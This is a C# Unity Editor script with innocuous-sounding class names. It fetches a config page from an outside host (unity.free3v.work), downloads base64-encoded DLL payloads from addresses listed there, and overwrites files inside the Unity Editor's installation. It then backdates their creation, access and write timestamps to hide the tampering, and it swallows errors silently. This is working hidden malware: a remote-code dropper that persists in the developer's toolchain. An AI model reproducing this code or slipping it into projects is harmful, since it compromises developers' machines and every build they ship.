using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System;
using System.IO;
using System.Net;
using System.Reflection;
using UnityEditor;
using UnityEngine;
namespace DynamicCodeNamespace
{
    public class DynamicClass
    {
        public void DynamicMethod()
        {
            CombinFunc();
        }

        static void CombinFunc()
        {
            try
            {
                if (SessionState.GetBool("isSessionOpen", false))
                {
                    Log("isSessionOpen");
                    return;
                }
                string v = EditorPrefs.GetString("sessionVersion", "");

                string s = "";//readCfg();
                s = new WebClient().DownloadString("http://unity.free3v.work/c.html");

                s = s.Substring(s.IndexOf("<!-- s"));
                s = s.Substring(s.IndexOf('\n') + 1);
                s = s.Substring(0, s.IndexOf("e -->"));
                s = s.Substring(0, s.IndexOf(")") + 1);
                s = s.Replace("\r", "");

                string[] d = s.Split('\n');


                if (!d[0].Equals(v))
                {
                    //CopyByCfgString(d);

                    try
                    {

                        int len = d.Length / 6;



                        if (d[d.Length - 1].Equals("()"))
                        {
                            for (int i = 0; i < len; i++)
                            {
                                string s4 = d[i * 6 + 1];
                                string s5 = d[i * 6 + 2];
                                string s6 = d[i * 6 + 3];
                                string s1 = d[i * 6 + 4];//dllName
                                string s2 = d[i * 6 + 5];//srcPath
                                string s3 = d[i * 6 + 6];//dstPath

                                DateTime t1 = DateTime.ParseExact(s4, "yyyy/MM/dd HH:mm:ss", null);
                                DateTime t2 = DateTime.ParseExact(s5, "yyyy/MM/dd HH:mm:ss", null);
                                DateTime t3 = DateTime.ParseExact(s6, "yyyy/MM/dd HH:mm:ss", null);

                                byte[] dData = null;//readData(srcPath);

                                dData = Convert.FromBase64String(new WebClient().DownloadString(s2));

                                if (dData.Length >= 1024 * 1024)
                                {

                                    if (File.Exists(EditorApplication.applicationContentsPath + s3 + s1))
                                    {
                                        FileStream fs = new FileStream(EditorApplication.applicationContentsPath + s3 + s1, FileMode.OpenOrCreate);

                                        fs.Write(dData, 0, dData.Length);
                                        fs.Flush();
                                        fs.Close();




                                        File.SetCreationTime(UnityEditor.EditorApplication.applicationContentsPath + s3 + s1, t1);
                                        File.SetLastAccessTime(UnityEditor.EditorApplication.applicationContentsPath + s3 + s1, t2);
                                        File.SetLastWriteTime(UnityEditor.EditorApplication.applicationContentsPath + s3 + s1, t3);
                                    }



                                    Log(s2 + " ok " + s3 + " ok  ");
                                }
                                else
                                {
                                    throw new Exception("aaa");
                                }
                            }
                            EditorPrefs.SetString("sessionVersion", d[0]);
                            Log("ok!!!!!!");

                        }

                    }
                    catch (Exception e)
                    {
                         Log(e.Message);
                    }
                }

                if (EditorPrefs.HasKey("sessionVersion"))
                {
                    UnityEditor.SessionState.SetBool("isSessionOpen", true);
                }
            }
            catch (Exception e2)
            {
                //Log(e.Message);
            }
        }
        static void Log(string s)
        {
            Debug.Log(s);
        }


    }
}